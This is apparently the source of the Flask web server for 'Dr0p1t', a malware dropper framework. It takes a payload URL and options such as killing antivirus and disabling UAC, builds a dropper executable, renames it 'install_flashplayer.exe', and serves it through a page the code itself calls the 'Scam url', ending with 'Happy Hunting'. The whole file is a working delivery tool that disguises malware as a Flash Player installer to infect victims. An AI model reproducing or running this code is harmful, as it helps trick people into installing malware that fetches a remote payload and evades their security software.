# -*- coding: utf-8 -*-
from time import strftime
from flask import Flask,render_template,request,current_app,abort
import os,random,re,subprocess,shutil,sys,traceback
from core.color import *
from core import color

if sys.version_info[0]==3:
	from urllib.parse import urlparse
elif sys.version_info[0]==2:
	from urlparse import urlparse

global G, Y, B, R, W , M , C , end
IP = None
c1=R
c2 = random.choice([G, Y, B, M , C])

try:
	os.remove( "server.log" )
	os.remove( "cmd.log" )
except:
	pass

app = Flask( __name__ ,template_folder="templates" )

@app.route('/')
def index():
	global IP
	IP = urlparse(request.url).netloc
	f = open( os.path.join('templates','Server_version.txt') ,"r" )
	ver = f.read().strip()
	f.close()
	title = "Dr0p1t Server V{}".format( ver )
	return render_template("index.html",Page_title=title,IP=IP )

@app.route("/params",methods=['POST'])
def params():
	try:
		os.remove( os.path.join( "static","data","install_flashplayer.exe") )
	except:
		pass

	if request.form['xurl']=="":
		return "<h1>Error!! </h1><h2>Url is missing</h2>"

	url = request.form['xurl']

	params = {}
	for p in ["zip","sp","tp","psp","killav","disuac","upx","bats","pss","vbss","ico","event","o32","o64"]:
		try:
			params[p] = request.form[p]
		except:
			pass

	#Filtering params
	valid = {}
	for k in list(params.keys()):
		if params[k] == "":
			blah = params.pop(k)
		else:
			valid[k]=params.get(k)
	if os.name == 'nt':
		installer = "Dr0p1t.py "
	else:
		installer = "python Dr0p1t.py "

	command = installer + url + " "
	text_boxes = ["bats","pss","vbss","ico"]

	def param_switch(p):
	    return { "zip":"--zip" , "sp":"-s" , "tp":"-t" , "psp":"-a" , "killav":"-k" , "disuac":"--nouac" , "upx":"--upx" , 'bats': "-b" , 'pss': "-p" , "vbss":"-v" , "ico":"-i" , "event":"--noclearevent" , "o32":"--only32" , "o64":"--only64" }[p]

	for param in valid:
		if param in text_boxes:
			command += "{0} {1} ".format( param_switch(param) , valid[param] )
		else:
			command += "{0} ".format( param_switch(param) )

	colored_print("+ Received command : "+command,"g")

	def get_url_from(ins,c):
		u = c.split(ins)[1].split(" ")[0]
		#django url validation regex
		regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
		Nurl = regex.search(u)
		if Nurl == None:
			return "<h1>Bad url parameter!</h1>"
		else:
			return Nurl.group()

	valid_command  = installer
	url            = get_url_from(installer,command) + " "
	valid_command += url
	strings_regex  = re.compile("^[ A-Za-z0-9_@./#&-]*$")
	Nstr = strings_regex.search( command.split(url)[1] )
	if Nstr == None:
		return "<h1>Bad parameters!</h1>"
	else:
		valid_command += Nstr.group()

	colored_print("+ After validation : "+valid_command,"g")
	blah = subprocess.Popen(valid_command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	output = (blah.stdout.read()+blah.stderr.read()).decode()
	if "[*] Finished" in output:
		colored_print("+ Exe generated!","b")
		file_name = output.split("Dr0pp3r as ")[1].split(" in output ")[0]

		global IP
		if IP == None:
			IP = urlparse(request.url).netloc

		blah = os.rename( os.path.join( "output",file_name ),os.path.join( "static","data","install_flashplayer.exe" ) )
		return '<center><h1>Executable generated!</h1><h2>Let\'s work ;) <br>   The Scam url is <a href="http://{0}/download" target="_blank">http://{0}/download</a></h2> <h3> <a href="http://{0}/static/data/install_flashplayer.exe" target="_blank">Direct download url</a></h3> <b>Happy Hunting</b></center>'.format(IP)
	else:
		print("Error in exe generating! [Check Server.log and cmd.log]")
		f  = open("cmd.log","w")
		f.write(output)
		f.close()
		return "<h1>Error in generating! [ Check your parameters ]</h1>"

@app.route("/download",methods=['GET'])
def Scam_Serve():
	return app.send_static_file("Scam.html" )

@app.after_request
def after_request(response):
    timestamp = strftime('[%Y-%b-%d %H:%M]')
    f = open("server.log","a").write( "\n"+"--"*10+"\n"+'%s %s %s %s %s %s'%(timestamp, request.remote_addr, request.method, request.scheme, request.full_path, response.status) )
    return response

@app.errorhandler(Exception)
def exceptions(e):
    tb = traceback.format_exc()
    timestamp = strftime('[%Y-%b-%d %H:%M]')
    f = open("server.log","a").write( "\n"+"--"*10+"\n"+'%s %s %s %s %s 5xx INTERNAL SERVER ERROR\n%s'%(timestamp, request.remote_addr, request.method, request.scheme, request.full_path, tb) )
    return abort(500)

if __name__ == '__main__':
	f = open('server.log', "w").close()
	set_colors()
	info = "\t\tAuthor  : Karim Shoair ( D4Vinci )\t Server version : {} \n".format( open( os.path.join( "templates", 'Server_version.txt' ) ,"r" ).read().strip() )
	banners =['''
       ....       -- [D]r0p1t [F]ramework [S]erver --                       s
   .xH888888Hx.                     .n~~%x.                       oe       :8
 .H8888888888888:      .u    .    x88X   888.   .d``            .@88      .88
 888*"""?""*88888X   .d88B :@8c  X888X   8888L  @8Ne.   .u  ==*88888     :888ooo
'f     d8x.   ^%88k ="8888f8888rX8888X   88888  %8888:u@88N    88888   -*8888888
'>    <88888X   '?8   4888>'88" 88888X   88888X  `888I  888.   88888     8888
 `:..:`888888>    8>  4888> '   88888X   88888X   888I  888I   88888     8888
        `"*88     X   4888>     88888X   88888f   888I  888I   88888     8888
   .xHHhx.."      !  .d888L .+  48888X   88888  uW888L  888'   88888    .8888Lu=
  X88888888hx. ..!   ^"8888*"    ?888X   8888" '*88888Nu88P    88888    ^%888*
 !   "*888888888"       "Y"       "88X   88*`  ~ '88888F`      88888      'Y"
        ^"***"`                     ^"==="`       888 ^     '**%%%%%%**
                                                  *8E  - Always remember that there's no patch for human stupidity! -
                                                  '8>
                                                   "
	''', """
88888888ba,                 ,a8888a,                88
88      `"8b              ,8P"'  `"Y8,            ,d88   ,d
88        `8b            ,8P        Y8,         888888   88
88         88 8b,dPPYba, 88          88 8b,dPPYba,  88 MM88MMM
88         88 88P'   "Y8 88          88 88P'    "8a 88   88
88         8P 88         `8b        d8' 88       d8 88   88
88      .a8P  88          `8ba,  ,ad8'  88b,   ,a8" 88   88,
88888888Y"'   88            "Y8888P"    88`YbbdP"'  88   "Y888
  -- [D]r0p1t [F]ramework [S]erver --   88
                                        88  - Always remember that there's no patch for human stupidity! -
		"""]
	banner = random.choice(banners)
	print_banner( banner ,info ,c1 ,c2 )
	app.run(host="0.0.0.0",port=5000)
